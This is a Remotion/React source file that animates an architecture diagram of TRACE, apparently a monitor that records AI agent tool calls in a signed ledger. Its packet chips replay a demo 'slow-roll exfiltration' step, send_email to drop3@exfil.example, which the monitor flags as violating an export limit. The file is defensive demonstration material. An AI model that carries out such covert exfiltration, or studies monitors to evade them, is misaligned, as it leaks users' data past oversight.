import React from 'react';
import {AbsoluteFill, Easing, useCurrentFrame, useVideoConfig} from 'remotion';
import type {DemoSpec} from '../types';
import {caption as captionTokens, color, easing, font, layout as grid, motion, type as T} from '../../engine/tokens';
import {ArchDiagram, asDiagramLayout} from '../../engine/diagram';
import type {BuildSpec, CameraKey, FocusSpec, HighlightSpec, PacketSpec, SafeArea} from '../../engine/diagram';
import traceLayout from '../../data/diagrams/trace.layout.json';

const L = asDiagramLayout(traceLayout);
const easeText = Easing.bezier(easing.text[0], easing.text[1], easing.text[2], easing.text[3]);
const clamp01 = (v: number) => Math.max(0, Math.min(1, v));

// A quiet stand-in for the pin wall: charcoal steel under a soft key light, pin heads
// barely there. In the film the diagram sits on the real wall.
const Ground: React.FC = () => {
  const {width: W, height: H} = useVideoConfig();
  const pitch = 0.0123 * H;
  const rowH = pitch * Math.sqrt(3);
  return (
    <svg width={W} height={H} style={{position: 'absolute', inset: 0}}>
      <defs>
        <radialGradient id="dd-pool" cx="0.55" cy="0.45" r="0.78">
          <stop offset="0" stopColor="#1D2120" />
          <stop offset="0.55" stopColor="#121514" />
          <stop offset="1" stopColor="#070908" />
        </radialGradient>
        <pattern id="dd-pins" width={pitch} height={rowH} patternUnits="userSpaceOnUse">
          <circle cx={pitch * 0.5} cy={rowH * 0.25} r={pitch * 0.2} fill="#FFFFFF" opacity={0.035} />
          <circle cx={0} cy={rowH * 0.75} r={pitch * 0.2} fill="#FFFFFF" opacity={0.035} />
          <circle cx={pitch} cy={rowH * 0.75} r={pitch * 0.2} fill="#FFFFFF" opacity={0.035} />
        </pattern>
        <radialGradient id="dd-vig" cx="0.55" cy="0.45" r="0.85">
          <stop offset="0.55" stopColor="#000" stopOpacity={0} />
          <stop offset="1" stopColor="#000" stopOpacity={0.55} />
        </radialGradient>
      </defs>
      <rect width={W} height={H} fill="url(#dd-pool)" />
      <rect width={W} height={H} fill="url(#dd-pins)" />
      <rect width={W} height={H} fill="url(#dd-vig)" />
    </svg>
  );
};

// The caption scrim of the film, under the packet log; mirrored at the top, under the
// kicker, while the camera is close.
const Scrim: React.FC<{k: number; top?: boolean}> = ({k, top = false}) => {
  const {fromH, maxAlpha} = grid.captionScrim;
  const from = top ? 0.18 : fromH;
  return (
    <AbsoluteFill
      style={{
        pointerEvents: 'none',
        opacity: k,
        background: `linear-gradient(to ${top ? 'top' : 'bottom'}, rgba(5,8,7,0) ${(1 - (top ? from : 1 - from)) * 100}%, rgba(5,8,7,${maxAlpha}) 100%)`,
      }}
    />
  );
};

// Blur-and-fade focus pull, as the film's type does it.
const pull = (t: number, at: number, out: number | null, H: number) => {
  const inK = easeText(clamp01((t - at) / motion.textFocusPull.inS));
  const outK = out == null ? 1 : 1 - easeText(clamp01((t - out) / motion.textFocusPull.outS));
  const k = Math.min(inK, outK);
  return {opacity: k, filter: `blur(${((1 - k) * motion.textFocusPull.blurAt1080 * H) / 1080}px)`};
};

const HEADLINE_OUT = 4.3;

const Titles: React.FC = () => {
  const frame = useCurrentFrame();
  const {fps, height: H, width: W} = useVideoConfig();
  const t = frame / fps;
  const x = grid.marginLeftW * W;
  const ks = T.monoKicker.size * H;
  const hs = T.caption.size * H;
  const top = 0.05 * H;
  return (
    <AbsoluteFill style={{pointerEvents: 'none'}}>
      <div
        style={{
          position: 'absolute',
          left: x,
          top,
          fontFamily: font.mono,
          fontSize: ks,
          lineHeight: 1.2,
          fontWeight: T.monoKicker.weight,
          letterSpacing: `${T.monoKicker.tracking}em`,
          color: color.accent.mintLabel,
          textTransform: 'uppercase',
          ...pull(t, 0.15, null, H),
        }}
      >
        TRACE · tracekit, module by module
      </div>
      <div
        style={{
          position: 'absolute',
          right: x,
          top: top + ks * 0.12,
          fontFamily: font.mono,
          fontSize: T.monoCardLabel.size * H,
          lineHeight: 1.2,
          fontWeight: 500,
          letterSpacing: '0.04em',
          color: color.text.tertiary,
          textAlign: 'right',
          ...pull(t, 0.9, null, H),
        }}
      >
        github.com/AnwarDebes/trace @ {L.commit?.slice(0, 7)}
      </div>
      <div
        style={{
          position: 'absolute',
          left: x,
          top: top + ks * 1.2 + 0.018 * H,
          fontFamily: font.sans,
          fontSize: hs,
          lineHeight: 1.2,
          fontWeight: 600,
          letterSpacing: `${T.caption.tracking}em`,
          color: color.text.display,
          ...pull(t, 0.45, HEADLINE_OUT, H),
        }}
      >
        Every arrow is a line of code you can{' '}
        <span style={{fontFamily: font.serif, fontStyle: 'italic', fontWeight: 400, fontSize: hs * font.emScale, color: color.accent.mint}}>check.</span>
      </div>
    </AbsoluteFill>
  );
};

// The film's grammar for this repo: the system assembles from its sources, one tool call
// travels the behaviour channel into a signed certificate, the content channel lights up,
// and the camera opens the hash chain to read the rule it signs with.
const SAFE_TITLED: SafeArea = {left: grid.marginLeftW, right: 1 - grid.marginLeftW, top: 0.2, bottom: 0.8};
const SAFE_WIDE: SafeArea = {left: 0.045, right: 0.955, top: 0.115, bottom: 0.775};
const SAFE_CARD: SafeArea = {left: 0.1, right: 0.9, top: 0.17, bottom: 0.87};

const camera: CameraKey[] = [
  {at: 0, target: 'all', zoom: 1.07, pitch: 15, yaw: -6, offset: [0.01, 0.012], safe: SAFE_TITLED},
  {at: 4.2, target: 'all', zoom: 1, pitch: 6, yaw: -2.2, ease: 'camera', safe: SAFE_TITLED},
  {at: 5.7, target: 'all', zoom: 1, pitch: 4.5, yaw: -1.6, ease: 'camera', safe: SAFE_WIDE},
  {at: 10.45, target: 'all', zoom: 1.045, pitch: 2.5, yaw: -0.8, ease: 'linear', safe: SAFE_WIDE},
  {at: 12.05, target: 'ledger', open: true, zoom: 0.84, pitch: 0, yaw: 0, ease: 'camera', safe: SAFE_CARD},
  {at: 14, target: 'ledger', open: true, zoom: 0.872, pitch: 0, yaw: 0, ease: 'linear', safe: SAFE_CARD},
];

// One tool call from TRACE's live demo (live/scenarios.js, the slow-roll exfiltration: the
// third email to an outside address). The chips are the values TRACE's own engine records
// for it, from a run of that scenario: the ledger payload, the sealed session, the verdict.
const PACKET_AT = 4.95;
const packets: PacketSpec[] = [
  {
    path: L.paths?.behaviour ?? [],
    at: PACKET_AT,
    speed: 455,
    dwell: 0.27,
    chips: [
      `send_email({"to":"drop3@exfil.example","subject":"fyi 3"})`,
      `{"export":1,"target_external":1,"within_scope":1,"write":1}`,
      `"violated_now":["count_le(export,2,50)"]`,
      `n_entries 7 · session_ok false · merkle_root signed`,
      `verify_ledger(ledger, cert, key)`,
    ],
    result: {label: 'returns', text: `{"chain_ok":true,"sig_ok":true,"merkle_ok":true,"ok":true}`, cite: 'ledger.py:285'},
  },
];

const highlights: HighlightSpec[] = [
  {
    paths: [['engine', 'content_guard', 'ledger'], ['booleanize', 'content_guard'], ['automata', 'tm', 'content_guard']],
    from: 8.85,
    to: 10.55,
    fade: 0.5,
  },
];

const focus: FocusSpec[] = [{node: 'ledger', from: 10.75, fade: 1.0}];
const build: BuildSpec = {at: 0.4, span: 3.6};

type DemoProps = {ground?: boolean; diagram?: boolean; titles?: boolean};

const DiagramDemo: React.FC<DemoProps> = ({ground = true, diagram = true, titles = true}) => {
  const frame = useCurrentFrame();
  const {fps} = useVideoConfig();
  const t = frame / fps;
  const scrim = clamp01((t - PACKET_AT + 0.2) / 0.5) * (1 - clamp01((t - 10.2) / 0.6));
  const topScrim = clamp01((t - 10.7) / 0.9);
  return (
    <AbsoluteFill style={{backgroundColor: color.wall.deep}}>
      {ground ? <Ground /> : null}
      {ground ? <Scrim k={scrim} /> : null}
      {diagram ? (
      <ArchDiagram
        layout={L}
        build={build}
        camera={camera}
        packets={packets}
        highlights={highlights}
        focus={focus}
        packetLog={{x: grid.marginLeftW, y: captionTokens.lastBaselineH - 0.012, lines: 3, hold: 1.5}}
      />
      ) : null}
      {ground ? <Scrim k={topScrim} top /> : null}
      {titles ? <Titles /> : null}
    </AbsoluteFill>
  );
};

export const demo: DemoSpec = {id: 'DiagramDemo', component: DiagramDemo, durationInFrames: 840};
